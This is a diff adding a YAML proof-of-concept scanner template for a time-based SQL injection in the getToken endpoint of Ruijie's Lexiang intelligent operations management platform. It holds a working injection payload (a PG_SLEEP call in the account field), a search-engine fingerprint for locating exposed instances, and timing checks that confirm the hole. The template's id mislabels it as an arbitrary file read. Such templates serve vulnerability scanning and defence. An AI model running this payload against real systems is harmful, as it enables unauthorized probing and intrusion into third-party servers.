@@ -1,0 +1,20 @@
+id: poc-yaml-crocus-service-do-anyfile-read
+info:
+  name: 锐捷 乐享智能运维管理平台 getToken SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 乐享智能运维管理平台
+  hunter: web.title="乐享智能运维管理平台"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /auth-ui/v1/api/user/token/getToken
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: account=admin');SELECT PG_SLEEP({{.t1}})--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
+  expression: "status_code == 200 && \ncontains(body,\"密码或用户名输入错误\") &&\ncontains(headers,\"\
+    RIIL_LOGIN_VERIFICATION_CODE=\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
